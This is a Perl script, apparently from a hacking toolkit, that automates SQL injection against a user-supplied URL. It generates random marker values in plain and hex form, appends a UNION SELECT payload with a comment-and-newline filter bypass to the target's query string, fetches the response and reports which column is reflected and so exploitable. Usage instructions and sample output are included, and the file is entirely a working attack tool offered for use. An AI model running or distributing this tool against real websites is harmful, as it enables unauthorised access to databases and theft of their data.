#!/usr/bin/perl

																																
#	What the script does ? : This script will help you with SQli that hide the vulnerable column in the source.                  
#	Developper : Crown - 05/09/13 - Last update 09/06/14 																								
#	Usage : ./payload.pl <number of column> <size of column name> <target url> <ending delimiter>														
# 																																
#	Exemple : ./payload.pl 6 4  "http://www.site.com/xxxx.php?xx=x" "xx"                                                                                                
#	Output :																													
#																																
#	Payload with 6 column(s) (4 chars) : 'ML-1','r4-2','BE-3','bD-4','2H-5','HT-6'
#	Payload (hex mode) with 6 column(s) (4 chars) : 0x4d4c2d31,0x72342d32,0x42452d33,0x62442d34,0x32482d35,0x48542d36 
#	Full URL :==> http://www.xxxx.com./xxx.php?xxx=x and false union%23%0Aselect 0x4d4c2d31,0x72342d32,0x42452d33,0x62442d34,0x32482d35,0x48542d36--
#
#	Vulnerable column : (x) with payload : xxxx
#	Vulnerable column : (x) with payload : xxxx




use strict;
use warnings;
use LWP::Simple;

if(defined($ARGV[0]) == 0 || defined($ARGV[1]) == 0 || defined($ARGV[2]) == 0  || defined($ARGV[3]) == 0 ) 
{
	print("Usage : $0 <number of column> <size of column name> <target url> <ending delimiter>\n"); 
	exit(1); 
}

my ($number_column, $length_column_string, $char_buffer, $column, $column_hex) = ($ARGV[0],$ARGV[1],0,0,0);
my (@columns, @columns_hex) = ();
my @charset = qw(A Z E R T Y U I O P Q S D F G H J K L M W X C V B N 1 2 3 4 5 6 7 8 9 0 a z e r t y u i o p q s d f g h j k l m w x c v b n);

for(my $p = 1; $p <= $number_column; $p++)
{
	($column,$column_hex) = ("","");

	for(my $i = 0; $i < $length_column_string - 2; $i++)
	{
		$char_buffer = $charset[rand(62)];
		$column .= $char_buffer;
		$column_hex .= unpack('H*',"$char_buffer");
	}

	$column .= "-$p";
	$column_hex .= unpack('H*',"-");
	$column_hex .= unpack('H*',"$p");

	push(@columns, "'$column'");
	push(@columns_hex, "0x$column_hex");
}

($column,$column_hex) = (join(",",@columns),join(",",@columns_hex));

print "Payload with $number_column column(s) ($length_column_string chars) : $column\n\n";
print "Payload (hex mode) with $number_column column(s) ($length_column_string chars) : $column_hex\n\n";


my $link = $ARGV[2]." and false union%23%0Aselect $column_hex".$ARGV[3];
my $source =  get($link);
my $z = 1;

print "Full URL :==> $link\n\n";

foreach my $x (@columns) 
{
	$x =~ s/'//g;

	if($source =~ /$x/)
	{
		print "Vulnerable column : ($z) with payload : $x\n";
	}

	$z++;
}



